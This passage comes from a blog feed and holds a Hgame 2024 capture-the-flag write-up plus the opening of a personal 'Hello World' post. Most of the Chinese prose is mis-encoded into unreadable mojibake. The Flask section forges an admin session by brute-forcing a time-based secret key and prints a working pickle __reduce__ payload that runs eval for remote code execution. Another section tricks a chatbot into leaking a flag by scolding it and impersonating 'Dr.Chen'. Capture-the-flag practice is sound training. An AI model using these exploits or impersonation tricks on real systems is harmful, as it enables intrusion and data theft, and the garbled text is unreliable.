href="https://ctf.bugku.com/tool/hill">Bugku</a>è§£å†³ã€‚</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>è¿™éƒ¨åˆ†å› ä¸ºç¬¬ä¸€å‘¨çš„ç®€å•å°±å°è¯•äº†ä¸€ä¸‹ã€‚</p><h3 id="1-ezASM"><a href="#1-ezASM" class="headerlink" title="1.ezASM"></a>1.ezASM</h3><p>ä¸€å¼€å§‹å»ä¸´æ—¶å­¦ä¹ äº†ä¸€ä¸‹æ±‡ç¼–çŸ¥è¯†ï¼Œåæ¥æ„Ÿè§‰æ²¡å¿…è¦ï¼ŒåƒCè¯­è¨€ç†è§£åº”è¯¥å°±å¯ä»¥ï¼Œäºæ˜¯æŠŠä¸Šé¢cé‡Œçš„æ•°å’Œ0x22å¼‚æˆ–ä¸€ä¸‹ï¼ŒASCIIè½¬æ–‡å­—å°±æ˜¯flagäº†ã€‚</p><p><img src="/img/Hgame2024/Week1/14.png"></p><h3 id="2-ezUPX"><a href="#2-ezUPX" class="headerlink" title="2.ezUPX"></a>2.ezUPX</h3><p>å¦‚é¢˜ï¼Œæ˜¯ä¸ªUPXï¼Œæ‰€ä»¥å…ˆç”¨upxå»å£³å³å¯ã€‚</p><p><img src="/img/Hgame2024/Week1/15.png"></p><p><img src="/img/Hgame2024/Week1/16.png"></p><p>è¾“å…¥çš„flagè¦ä¸0x32å¼‚æˆ–åç­‰äºbyte_1400022A0çš„å†…å®¹ï¼Œæ‰€ä»¥æ‰¾åˆ°å¹¶å¼‚æˆ–å›å»å°±å¾—åˆ°flagã€‚ï¼ˆæ–°å­¦çš„å¿«æ·é”®shift+eå¯¼å‡ºè¿™äº›æ–‡æœ¬ï¼‰</p><p><img src="/img/Hgame2024/Week1/17.png"></p><p><img src="/img/Hgame2024/Week1/18.png"></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="1-ek1ng-want-girlfriend"><a href="#1-ek1ng-want-girlfriend" class="headerlink" title="1.ek1ng_want_girlfriend"></a>1.ek1ng_want_girlfriend</h3><p>æµé‡åˆ†æé¢˜ï¼Œæ˜¯å¯¹Wiresharkä½¿ç”¨ï¼ˆå’Œek1ngï¼‰çš„åˆæ­¥ä»‹ç»ï¼Œæµé‡æ–‡ä»¶ä¸­å‘ç°ä¸€å¼ ek1ng.jpgçš„å›¾ç‰‡ï¼Œå°†å…¶å¯¼å‡ºï¼Œå›¾ç‰‡æ˜¯ek1ngçš„ç…§ç‰‡å’Œflagã€‚</p><p><img src="/img/Hgame2024/Week2/1.png"></p><p><img src="/img/Hgame2024/Week2/2.png"></p><p><img src="/img/Hgame2024/Week2/3.png"></p><h3 id="2-ezWord"><a href="#2-ezWord" class="headerlink" title="2.ezWord"></a>2.ezWord</h3><p>ä¸‹è½½ä¸€ä¸ªattachment.zipï¼Œé‡Œé¢â€œè¿™æ˜¯ä¸€ä¸ªwordæ–‡ä»¶.docxâ€ï¼Œæ‰“å¼€æ˜¯â€œä½ å¥½ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å†…éƒ¨æœ‰ä½ æƒ³è¦çš„â€å’Œä¸€å¼ å›¾ç‰‡ã€‚å¤§æ¦‚æ˜¯æ–‡æ¡£åŠ å¯†ï¼ŒæŠŠæ–‡æ¡£æ”¾è¿›010Editorï¼Œå‘ç°PKå­—æ ·ï¼Œè¯´æ˜å†…éƒ¨è—æœ‰å‹ç¼©åŒ…ã€‚æ”¹ä¸ºzipåç¼€å¹¶è§£å‹ï¼Œå‘ç°ä¸¤å¼ çœ‹èµ·æ¥ä¸€æ ·çš„å›¾ç‰‡â€œ100191209_p0.jpgâ€â€œimage1.pngâ€å’Œsecret.zipï¼ˆæ‰“å¼€æ˜¯åŠ å¯†çš„secret.txtå’Œç›´æ¥å¯è¯»çš„æç¤ºâ€œä½ å¥½ï¼Œå¾ˆé«˜å…´ä½ çœ‹åˆ°äº†è¿™ä¸ªå‹ç¼©åŒ…ã€‚è¯·æ³¨æ„ï¼šè¿™ä¸ªå‹ç¼©åŒ…çš„å¯†ç æœ‰11ä½æ•°è€Œä¸”åŒ…å«å¤§å†™å­—æ¯å°å†™å­—æ¯å’Œæ•°å­—ã€‚è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„æ˜¯ï¼Œé‡Œé¢çš„è¿™ä¸€å †è‹±æ–‡decodeä¹‹åçœ‹ä¸Šå»æ˜¯ä¸€å †ä¸­æ–‡ä¹±ç å®é™…ä¸Šè¿™æ˜¯æ­£å¸¸ç°è±¡ï¼Œå¦‚æœçœ‹åˆ°å®ƒä»¬é‚£ä¹ˆä½ å°±ç¦»æˆåŠŸåªå·®ä¸€æ­¥äº†ã€‚â€ï¼‰æ ¹æ®é¢˜ç›®æè¿°â€œç ´è¯‘å›¾ç‰‡çš„æ°´å°â€å¯ä»¥çŸ¥é“è€ƒç‚¹å¤§æ¦‚ç‡æ˜¯å›¾ç‰‡ç›²æ°´å°ï¼Œä¸¤å¼ ç…§ç‰‡ä¸€å¼ æ˜¯åŸå›¾ä¸€å¼ æ˜¯æ‰“æ°´å°åçš„å›¾ï¼Œè€Œå‹ç¼©åŒ…çš„å¯†ç åº”è¯¥å°±æ˜¯æ°´å°å†…å®¹ã€‚å› æ­¤ç”¨githubä¸Šçš„â€œbwmforpy3.pyâ€å¤„ç†ã€‚</p><p><img src="/img/Hgame2024/Week2/4.png"></p><p>åœ¨å¤„ç†åå¾—åˆ°çš„â€œfan_bwm.pngâ€ä¸­å¾—åˆ°å‹ç¼©åŒ…å¯†ç ã€‚æ‰“å¼€secret.txtï¼Œé‡Œé¢æ˜¯æœ‰äº›è«åå…¶å¦™çš„ç–‘ä¼¼é‚®ä»¶å†…å®¹ï¼Œæˆ‘ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯æŠŠä¿¡æ¯éšè—åœ¨æ–‡æœ¬ä¸­ï¼Œåæ¥ç›´æ¥æ”¾åˆ°æœç´¢å¼•æ“æœå‘ç°æœ‰ä¸€ç§åŠ å¯†æ–¹æ³•åŠ å¯†åçš„ç»“æœåˆšå¥½ç›¸ä¼¼<a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a>ã€‚</p><p><img src="/img/Hgame2024/Week2/5.png"></p><p>å¾—åˆ°è§£å¯†ç»“æœï¼Œè¿˜å·®æœ€åä¸€å±‚åŠ å¯†ã€‚æ ¹æ®æç¤ºUnicodeï¼ˆæ„Ÿè§‰ä¸æç¤ºçœŸæƒ³ä¸åˆ°ï¼‰ï¼ŒæŸ¥çœ‹è¿™äº›ä¸­æ–‡ä¹±ç çš„Unicodeç¼–ç ã€‚</p><p><img src="/img/Hgame2024/Week2/6.png"></p><p>å†çœ‹çœ‹hgameçš„ç¼–ç ã€‚</p><p><img src="/img/Hgame2024/Week2/7.png"></p><p>å‰å‡ ä¸ªå­—ç¬¦ä¸€ä¸€å¯¹åº”ï¼Œå‘ç°éƒ½åˆšå¥½ç›¸å·®31753ï¼Œè¯´æ˜è¿™æ®µä¸­æ–‡æ˜¯flagç»è¿‡Unicodeç¼–ç çš„åç§»çš„ç»“æœã€‚æ‰€ä»¥ç”¨pythonæŠŠä»–ä»¬éƒ½å¤„ç†ä¸€ä¸‹å¾—åˆ°flagã€‚</p><p><img src="/img/Hgame2024/Week2/8.png"></p><p><img src="/img/Hgame2024/Week2/9.png"></p><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="1-myflaskï¼ˆå½“æ—¶æ²¡å®Œæˆï¼Œäº‹åå‘ç°å°±å·®ä¸€ç‚¹ç‚¹ç‚¹ç‚¹â€¦â€¦å‘œå‘œå‘œï¼‰"><a href="#1-myflaskï¼ˆå½“æ—¶æ²¡å®Œæˆï¼Œäº‹åå‘ç°å°±å·®ä¸€ç‚¹ç‚¹ç‚¹ç‚¹â€¦â€¦å‘œå‘œå‘œï¼‰" class="headerlink" title="1.myflaskï¼ˆå½“æ—¶æ²¡å®Œæˆï¼Œäº‹åå‘ç°å°±å·®ä¸€ç‚¹ç‚¹ç‚¹ç‚¹â€¦â€¦å‘œå‘œå‘œï¼‰"></a>1.myflaskï¼ˆå½“æ—¶æ²¡å®Œæˆï¼Œäº‹åå‘ç°å°±å·®ä¸€ç‚¹ç‚¹ç‚¹ç‚¹â€¦â€¦å‘œå‘œå‘œï¼‰</h3><p>ä¸€è¿›å…¥å°±æŠŠåç«¯çš„app.pyå‘äº†è¿‡æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first â†“</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>ç ”ç©¶ä¸€ä¸‹ä»£ç ï¼Œåœ¨è¿›å…¥â€˜&#x2F;â€™æ—¶å°†å®¢æˆ·ç«¯çš„sessionå†…usernameå†…å®¹è®¾ä¸ºguestå¹¶è¿”å›app.pyã€‚åœ¨è¿›å…¥â€˜&#x2F;flagâ€™æ—¶æœ‰sessionçš„å‰æä¸‹è‹¥ä¸ºgetæ–¹æ³•åˆ™æ˜¾ç¤ºå½“å‰çš„usernameï¼Œå½“usernameç­‰äºadminæ—¶è¯»å–postæ–¹æ³•ä¼ é€’çš„pickle_dataå¹¶base64è§£ç ï¼Œç„¶åç”¨pickle.loads()å‡½æ•°ååºåˆ—åŒ–å­˜å‚¨è‡³userdataå¹¶è¿”å›ã€‚æ‰€ä»¥å¤§è‡´çš„æ€è·¯å°±æ˜¯ä¼ªé€ sessionä½¿è‡ªå·±çš„username&#x3D;adminï¼Œç„¶åä»¥pickleååºåˆ—åŒ–è§¦å‘RCEã€‚è€Œsessionä¼ªé€ çš„å‰ææ˜¯å¯¹åŸsessionè§£ç ä¿®æ”¹å¹¶å¾—åˆ°SECRET_KEYã€‚è§£ç sessionç”¨ç½‘ä¸Šæ‰¾çš„è„šæœ¬è·‘ä¸€ä¸‹å°±å¥½ï¼Œæ­£æ˜¯<code>&#123;&#39;username&#39;: &#39;admin&#39;&#125;</code>ã€‚SECRET_KEYå¦‚ä½•è·å¾—åˆ™çœ‹ä»£ç ä¸­app.config[â€˜SECRET_KEYâ€™]&#x3D;currentTimeï¼Œè€ŒcurrentTimeç­‰äºæŸä¸ªæŒ‰%H%M%Sæ ¼å¼çš„æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•å†™ä¸€ä¸ªå­—å…¸çˆ†ç ´SECRET_KEYã€‚</p><p><img src="/img/Hgame2024/Week2/10.png"></p><p><img src="/img/Hgame2024/Week2/11.png"></p><p>ç”¨flask-unsignçˆ†ç ´ã€‚</p><p><img src="/img/Hgame2024/Week2/12.png"></p><p>å¾—åˆ°SECRET_KEYç„¶åä¿®æ”¹guestä¸ºadminå¹¶ä¼ªé€ sessionå³å¯ã€‚ç„¶åæ”¾å…¥cookieå‘é€ï¼ŒæˆåŠŸã€‚</p><p><img src="/img/Hgame2024/Week2/13.png"></p><p><img src="/img/Hgame2024/Week2/14.png"></p><p>ç„¶åå°±æ˜¯å°è¯•é€šè¿‡pickleååºåˆ—åŒ–è§¦å‘RCEäº†ï¼Œå…ˆæ˜¯å‚»å‚»å»æŸ¥çœ‹app.pyæ‰€åœ¨ç›®å½•ç„¶åçªç„¶æƒ³èµ·æ¥åœ¨é”™è¯¯ä¼ å‚ä½¿ä¹‹æŠ¥é”™æ—¶å·²ç»æ˜¾ç¤ºäº†æ–‡ä»¶ç›®å½•ï¼Œåˆå»çœ‹äº†çœ‹app.pyæ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶å‘ç°åªæœ‰è¿™ä¸ªï¼Œç„¶åæƒ³çœ‹çœ‹ä¸Šçº§ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼ˆå¯èƒ½ç”¨é”™å‡½æ•°äº†ï¼‰ç»“æœè¿”å›ä¸ºç©ºã€‚æœ€åå› ä¸ºå‡ºé—¨åœ¨å¤–æ²¡æ³•åšé¢˜å¯¼è‡´æ—¶é—´ä¸è¶³æ¥ä¸åŠæˆªæ­¢å‰åšå®ŒT^T</p><p>åæ¥ï¼š</p><p>é‡æ–°å°è¯•ï¼Œæ„é€ payloadçš„ç¨‹åºå¦‚ä¸‹</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br><span class="hljs-keyword">class</span> payload(object):<br>def __reduce__(self):<br>return (eval, (<span class="hljs-string">&quot;open(&#x27;/flag&#x27;).read()&quot;</span>,))<br>###åŸæœ¬è¿™é‡Œä¹Ÿå†™çš„/flag.txtçš„ï¼Œçœ‹å®Œwpååˆ äº†txtè¯•äº†è¯•å‘ç°å¯ä»¥ï¼å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼ï¼ï¼ï¼ï¼ç—›è‹¦ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼###<br><br>a = pickle.dumps(payload(),protocol=<span class="hljs-number">0</span>)<br>print(b64encode(a).decode())<br></code></pre></td></tr></table></figure><p>è¿™æ®µè¯­å¥æœ¬è´¨ä¸Šå°±æ˜¯æ„é€ <code>__reduce__</code>é­”æœ¯æ–¹æ³•ï¼Œç„¶åå°†è¦æ‰§è¡Œçš„å‘½ä»¤pickleåºåˆ—åŒ–ï¼Œå†base64åŠ å¯†å¤„ç†ï¼Œæœ€åæŠŠè¾“å‡ºçš„ç»“æœè´´åˆ°<code>pickle_data=</code>åé¢postä¼ å‚å³å¯ã€‚ï¼ˆå…¶å®å°±æ˜¯æŠŠå‰é¢åˆ†æå‡ºæ¥çš„app.pyçš„å¤„ç†è¿‡ç¨‹åè¿‡æ¥ï¼‰</p><p><img src="/img/Hgame2024/Week2/15.png" alt="æœ€åæˆåŠŸäº†ã€‚"></p><p>å¯¹äºå…¶ä»–å°ç»†èŠ‚çš„ç ”ç©¶ï¼š</p><pre><code class="hljs">eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcteaQ.c9lMyjsOph-sEkwoxMqB9TzqwwAeyJ1c2VybmFtZSI6Imd1ZXN0In0.Zcthhg.ijiHa85G3dwoCC08Wlk6koLtEiI</code></pre><p>å°è¯•å¯¹æ¯”åä¸­é—´æ®µæ—¶é—´æˆ³åˆ·æ–°å°±å˜ï¼Œä¸æœåŠ¡å™¨æœ€æ–°æ•°æ®çš„æ—¶é—´æœ‰å…³ã€‚</p><pre><code class="hljs">&#39;SECRET_KEY&#39;=203048</code></pre><p>å°è¯•åˆ·æ–°åç”¨æ–°sessionçˆ†ç ´keyï¼Œè¿˜æ˜¯ä¸å˜çš„ã€‚ä½†å¯ç”¨æ–°é¶æœºå°±ä¸ä¸€æ ·äº†ï¼Œè¯´æ˜app.pyé‡Œæ‰€è·å–å¹¶èµ‹å€¼ç»™SECRET_KEYçš„æ—¶é—´æ˜¯é¶æœºå¼€å¯æ—¶é—´ã€‚</p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><h3 id="1-ä¸aièŠå¤©"><a href="#1-ä¸aièŠå¤©" class="headerlink" title="1.ä¸aièŠå¤©"></a>1.ä¸aièŠå¤©</h3><p>ä¸€é“ç®€å•AIé¢˜ï¼Œé¢˜ç›®æè¿°è®©æˆ‘ä»¬ä»AIå˜´é‡Œâ€œç¿˜å‡ºâ€flagï¼Œå¦‚å›¾ï¼š</p><p><img src="/img/Hgame2024/Week3/1.png"></p><p>å½“é—®AI flagçš„æ—¶å€™â€œBut first,could you please tell me your name?â€çŒœæµ‹AIä¼šæ ¹æ®èº«ä»½çš„åˆ¤æ–­é€‰æ‹©ç»™ä¸ç»™flagï¼Œå› æ­¤è¯´adminä½œä¸ºå°è¯•ï¼Œä½†AIè¡¨ç¤ºä»–ä¸èƒ½æä¾›flagã€‚</p><p><img src="/img/Hgame2024/Week3/2.png"></p><p>äºæ˜¯çŒœæµ‹adminåº”è¯¥ä¸æ˜¯æ­£ç¡®èº«ä»½ï¼Œä½†æˆ‘è¿˜æ˜¯è°´è´£äº†AIï¼Œæ²¡æƒ³åˆ°ä»–ä¸€è¾¹é“æ­‰ä¸€è¾¹å°±è¯´æ¼å˜´äº†ï¼Œä»–åªèƒ½æä¾›flagç»™Dr.Chenï¼Œæ¢ä¸ªèº«ä»½flagåˆ°æ‰‹ã€‚</p><h3 id="2-Blind-SQL-Injection"><a href="#2-Blind-SQL-Injection" class="headerlink" title="2.Blind SQL Injection"></a>2.Blind SQL Injection</h3><p>å¯¹SQLç›²æ³¨çš„æµé‡åˆ†æï¼Œå…ˆç”¨httpä½œä¸ºè¿‡æ»¤å™¨ç­›é€‰ï¼ŒæŒ‰æ—¶é—´é¡ºåºæ’åºï¼Œè¿™æ ·å‰ä¸€ä¸ªæ˜¯å‘é€åˆ°é¶æœºçš„è¯·æ±‚ï¼Œåä¸€ä¸ªè·Ÿçš„å°±æ˜¯ç›¸åº”çš„æœåŠ¡å™¨çš„å“åº”ã€‚</p><p><img src="/img/Hgame2024/Week3/3.png"></p><p>å…ˆå¤§è‡´äº†è§£è¿™é‡Œç”¨åˆ°çš„è¯­æ³•ï¼Œascii(x)å‡½æ•°å°±æ˜¯å°†å­—ç¬¦xè½¬ASCIIç ï¼Œsubstr(a,b,c)å‡½æ•°å°±æ˜¯æˆªå–aå­—ç¬¦ä¸²ä»bå¤„èµ·é•¿åº¦ä¸ºcçš„éƒ¨åˆ†ï¼Œreverse()å‡½æ•°åˆ™æ˜¯å°†å­—ç¬¦ä¸²å€’è½¬ï¼Œgroup_concat()å‡½æ•°å°†ç»„ä¸­çš„å­—ç¬¦ä¸²è¿æ¥æˆä¸ºå…·æœ‰å„ç§é€‰é¡¹çš„å•ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>å†çœ‹æ³¨å…¥çš„å†…å®¹ã€‚å›¾ä¸­substr(â€¦,33,1)å°±ç›¸å½“äºæå–ç¬¬33ä½å­—ç¬¦ç”¨äºæ“ä½œã€‚â€œ%3Eâ€æŒ‰åå…­è¿›åˆ¶ASCIIç å³ä¸ºâ€œ&gt;â€ï¼Œâ€œ%3Eâ€å‰é¢çš„éƒ¨åˆ†ascii()å‡½æ•°å°†â€œF1naI1yâ€ä¸­SQLæ³¨å…¥è€…æƒ³è·å¾—çš„å†…å®¹ç¬¬33ä½è½¬ä¸ºASCIIç ï¼Œæ¨æµ‹å¾—â€œ%3Eâ€åçš„æ•°åˆ™æ˜¯SQLæ³¨å…¥è€…æ‰€çŒœæµ‹çš„å­—ç¬¦çš„ASCIIç ã€‚è¿™é‡Œç”¨çš„æ˜¯å¸ƒå°”ç›²æ³¨ï¼ŒSQLæ³¨å…¥è€…è¦ç»“åˆå›æ˜¾åˆ¤æ–­çŒœæµ‹æ˜¯å¦æ­£ç¡®ã€‚å½“æ‰€æ±‚å†…å®¹çš„ASCIIç &gt;çŒœæµ‹çš„ASCIIç å³id&#x3D;1-1&#x3D;0æ—¶ï¼Œå›æ˜¾â€œERROR!!!â€ï¼›å½“æ‰€æ±‚å†…å®¹çš„ASCIIç &lt;&#x3D;çŒœæµ‹çš„ASCIIç å³id&#x3D;1-0&#x3D;1æ—¶ï¼Œå›æ˜¾â€œNO! Not this! Click others~~~â€ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰¾åˆ°å›æ˜¾ä¸ºâ€œNO! Not this! Click others~~~â€çš„æœ€å°ASCIIç å³ä¸ºè¯¥ä½çš„å†…å®¹ã€‚è¦è·å¾—å®Œæ•´å†…å®¹å°±æŠŠæ¯ä¸€ä½ï¼ˆæŒ‡substr(â€¦,n,1)ï¼‰æ‹¼æ¥èµ·æ¥ã€‚ä¸‹å›¾æ˜¯æœ¬é¢˜ä¸­çš„ä¸¤ç§å“åº”ï¼š</p><p><img src="/img/Hgame2024/Week3/4.png"></p><p><img src="/img/Hgame2024/Week3/5.png"></p><p>è€Œæ•´ä¸ªæµé‡æ–‡ä»¶ä¸­SQLçš„æ³¨å…¥åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†ï¼š</p><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯è·å–æ•°æ®åº“åç§°ï¼ˆtable_schemaï¼‰ï¼ŒæŒ‰ä¸Šè¿°æ–¹æ³•åˆ†æå¾—æ•°æ®åº“åç§°geekã€‚</p><p><img src="/img/Hgame2024/Week3/6.png"></p><p>ç¬¬äºŒéƒ¨åˆ†æ˜¯è·å–geekæ•°æ®åº“ä¸­çš„è¡¨åï¼ˆtable_nameï¼‰ï¼Œåˆ†æå¾—è¡¨åF1naI1yã€‚</p><p><img src="/img/Hgame2024/Week3/7.png"></p><p>ç¬¬ä¸‰éƒ¨åˆ†è·å–F1naI1yè¡¨ä¸­çš„åˆ—åï¼ˆcolumn_nameï¼‰ï¼Œåˆ†æå¾—å¯ç”¨åˆ—åpasswordã€‚</p><p><img src="/img/Hgame2024/Week3/8.png"></p><p>ç¬¬å››éƒ¨åˆ†è·å–passwordåˆ—ä¸­æ•°æ®ï¼Œè¿™é‡Œé¢å¤§æ¦‚å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„flagäº†ã€‚åŒç†åˆ†æå¯å¾—flag{cbabafe7-1725-4e98-bac6-d38c5928af2f}ï¼ˆå› ä¸ºreverse()å‡½æ•°ï¼ŒæŒ‰æ—¶é—´é¡ºåºå¾—åˆ°çš„æ˜¯å€’è¿‡æ¥çš„å†…å®¹ï¼Œå€’å›æ¥å°±æ˜¯flagï¼‰ã€‚</p><p><img src="/img/Hgame2024/Week3/9.png"></p><p>æœ€åæ€»åˆ†ä½åˆ—ç¬¬23åï¼Œ1540åˆ†ï¼Œå†æ¥å†åŠ±ï¼</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2024/05/04/hello-world/"/>
    <url>/2024/05/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello ! New world !</p><h2 id="Hello"><a href="#Hello" class="headerlink" title="Hello !"></a>Hello !</h2><h3 id="This-is-my-first-post"><a href="#This-is-my-first-post" class="headerlink" title="This is my first post !"></a>This is my first post !</h3><p>è¿™ç¯‡â€œæ–‡ç« â€ç®—æ˜¯æˆ‘è‡ªä»å¼€å§‹å­¦ä¹ webç›¸å…³å†…å®¹çš„ç¬¬ä¸€ç¯‡Blogï¼Œä¹Ÿæ˜¯æ­æˆä¸ªäººåšå®¢ç½‘ç«™çš„ç¬¬ä¸€ç¯‡Blogï¼Œæ›´æ˜¯äººç”Ÿä¸­çš„ç¬¬ä¸€ç¯‡Blogã€‚å†™è¿™æ ·çš„â€œç¬¬ä¸€ç¯‡â€ç”¨ä»¥çºªå¿µä¸‹ä¸€æ®µæœªæ¥çš„å¼€å§‹ã€‚</p><h3 id="The-end-The-beginning-ï¼"><a href="#The-end-The-beginning-ï¼" class="headerlink" title="The end ? The beginning ï¼"></a>The end ? The beginning ï¼</h3><p>ä½œä¸ºä¸€ä¸ªwebæŠ€æœ¯çš„å°ç™½ï¼Œæ­æˆè¿™æ ·çš„åšå®¢å¯¹å…ˆå‰çš„æˆ‘æ¥è¯´éƒ½æ˜¯ä¸€ä¸ªå€¼å¾—é‡è§†çš„åï¼ˆå½“ç„¶ï¼Œç°åœ¨è¿˜æ˜¯èœï¼Œä¹Ÿä¸ä¼šè®¤ä¸ºä¸å€¼å¾—^V^ï¼‰ï¼Œä½†æ˜¯ï¼Œå½“è¿™ä¸ªç›®æ ‡åœ¨æˆ‘æ‹–æ‹–æ‹‰æ‹‰åœ°å®ç°åä¹Ÿç»å¯¹ä¸ä¼šå˜æˆç»ˆç‚¹ï¼Œè€Œåº”å½“æ˜¯æˆ‘å­¦ä¹ ä¹‹è·¯çš„æ–°èµ·ç‚¹ï¼Œå°±åƒæ˜¯è®¸å¤šç¼–ç¨‹è¯­è¨€çš„ç¬¬ä¸€å¥â€œHello World!â€ä¸€èˆ¬ï¼Œæˆ‘æŠŠè¿™å½“åšæ˜¯æˆ‘çš„å¼€å§‹ã€‚</p><p>ç„¶è€Œï¼Œå­¦ä¹ ç»ˆå½’æ˜¯ä¸€ä»¶å¿«ä¹ä¸ç—›è‹¦å¹¶å­˜çš„äº‹æƒ…ï¼Œæˆ‘çš„ä¸€äº›é—®é¢˜æˆ–è®¸ä»ä¼šé˜»æŒ¡æˆ‘å­¦ä¹ çš„è„šæ­¥ã€‚ä¸€æ˜¯å­¦ä¹ çš„ä¿¡å¿ƒï¼Œæœ‰äº›æ—¶å€™ä¼šé‡åˆ°éš¾ä»¥è§£å†³çš„é—®é¢˜è€Œé™·å…¥æ— åŠ©å’Œå¤±æœ›ï¼Œéšåä¾¿æ˜¯æç½®ä¸€æ—ã€‚å½“ç„¶ï¼Œå¤§å®¶éƒ½çŸ¥é“è¿™æ˜¯æ­£å¸¸çš„ï¼Œæˆ‘ä¹Ÿå¸Œæœ›æˆ‘åœ¨æœªæ¥èƒ½å¤Ÿé€‚å½“åœ°æ”¾å¼ƒä½†ä¸æ‡ˆåœ°è¿½æ±‚ã€‚äºŒæ˜¯è¿™æ…¢ååçš„å­¦ä¹ 